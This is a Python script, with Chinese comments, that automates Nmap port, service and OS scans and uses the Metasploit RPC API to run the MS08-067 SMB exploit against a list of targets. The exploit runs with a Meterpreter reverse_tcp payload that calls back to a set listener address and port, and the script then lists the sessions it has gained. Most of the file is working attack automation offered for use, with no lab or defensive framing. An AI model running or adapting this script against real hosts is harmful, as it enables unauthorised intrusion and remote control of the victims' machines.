import nmap
import requests
import msgpack
import time
import json

class MetasploitAPI:
    def __init__(self, host, port, username, password):
        self.host = host
        self.port = port
        self.url = f"http://{host}:{port}/api/"
        self.username = username
        self.password = password
        self.token = None
        self.headers = {'Content-Type': 'binary/message-pack'}

    def login(self):
        data = {
            'method': 'auth.login',
            'username': self.username,
            'password': self.password
        }
        response = self._send_request(data)
        self.token = response.get('token')
        return self.token

    def _send_request(self, data):
        if self.token:
            data['token'] = self.token
        response = requests.post(self.url, headers=self.headers, data=msgpack.packb(data))
        return msgpack.unpackb(response.content)

    def create_console(self):
        data = {'method': 'console.create'}
        return self._send_request(data)

    def read_console(self, console_id):
        data = {'method': 'console.read', 'id': console_id}
        return self._send_request(data)

    def write_console(self, console_id, command):
        data = {'method': 'console.write', 'id': console_id, 'data': command}
        return self._send_request(data)

    def execute_module(self, module_type, module_name, options):
        data = {
            'method': 'module.execute',
            'module_type': module_type,
            'module_name': module_name,
            'options': options
        }
        return self._send_request(data)

    def list_sessions(self):
        data = {'method': 'session.list'}
        return self._send_request(data)

def select_tool():
    while True:
        choice = input("Enter the tool to use (Nmap or Metasploit): ").lower()
        if choice in ['nmap', 'metasploit']:
            return choice
        else:
            print("Invalid choice. Please enter 'Nmap' or 'Metasploit'.")

def get_targets_from_input():
    choice = input("Do you want to enter targets manually (Y/N)? ").lower()
    if choice == 'y':
        targets = input("Enter the target(s) to scan (comma-separated or range): ")
        return targets.strip().split(',')
    else:
        targets_file = input("Enter the path to the JSON file containing target list: ")
        return read_json_file(targets_file)

def save_to_json(data, filename):
    with open(filename, 'w') as json_file:
        json.dump(data, json_file, indent=4)
    print(f"Scan results saved to {filename}")

def read_json_file(filename):
    with open(filename, 'r') as json_file:
        data = json.load(json_file)
        targets = [entry['url'] for entry in data]
    return targets

def scan_with_nmap(targets):
    nm = nmap.PortScanner()
    scan_arguments = '-sS -sV -O -p-'
    print(f"Scanning {targets} with arguments: {scan_arguments}")
    nm.scan(hosts=','.join(targets), arguments=scan_arguments)

    results = {}
    for host in nm.all_hosts():
        results[host] = {
            'hostname': nm[host].hostname(),
            'state': nm[host].state(),
            'osclass': nm[host].get('osclass', []),
            'ports': []
        }
        for proto in nm[host].all_protocols():
            ports = nm[host][proto].keys()
            for port in sorted(ports):
                port_info = nm[host][proto][port]
                results[host]['ports'].append({
                    'port': port,
                    'state': port_info['state'],
                    'service': port_info.get('product', ''),
                    'version': port_info.get('version', ''),
                    'cpe': port_info.get('cpe', '')
                })
    return results

def exploit_with_metasploit(api, target, lhost, lport):
    api.login()
    console = api.create_console()
    console_id = console['id']
    
    exploit = 'exploit/windows/smb/ms08_067_netapi'
    payload = 'windows/meterpreter/reverse_tcp'
    options = {'RHOSTS': target, 'LHOST': lhost, 'LPORT': lport}

    command = f'use {exploit}\n'
    api.write_console(console_id, command)
    for option, value in options.items():
        command = f'set {option} {value}\n'
        api.write_console(console_id, command)
    command = f'set PAYLOAD {payload}\n'
    api.write_console(console_id, command)
    command = 'exploit -j\n'
    api.write_console(console_id, command)
    
    time.sleep(10)  # 等待利用模块执行
    result = api.read_console(console_id)
    print(result['data'])

    sessions = api.list_sessions()
    print('Sessions:', sessions)

    # 销毁控制台
    api.write_console(console_id, 'exit\n')
    api.write_console(console_id, 'exit\n')  # 在某些情况下，需要两次退出命令

# 示例使用
tool_choice = select_tool()
if tool_choice == 'nmap':
    # 获取扫描目标
    nmap_targets = get_targets_from_input()
    print("Nmap Scan Targets:", nmap_targets)
    
    # Nmap 扫描
    nmap_results = scan_with_nmap(nmap_targets)
    print("Nmap Scan Results:", nmap_results)

    # 保存扫描结果到JSON文件
    save_to_json(nmap_results, 'nmap_scan_results.json')
elif tool_choice == 'metasploit':
    # 获取扫描目标
    targets = get_targets_from_input()
    
    lhost = '192.168.1.101'
    lport = 4444
    
    # Metasploit 利用
    msf_api = MetasploitAPI(host='127.0.0.1', port=55553, username='msf', password='your_password')
    for target in targets:
        exploit_with_metasploit(msf_api, target, lhost, lport)
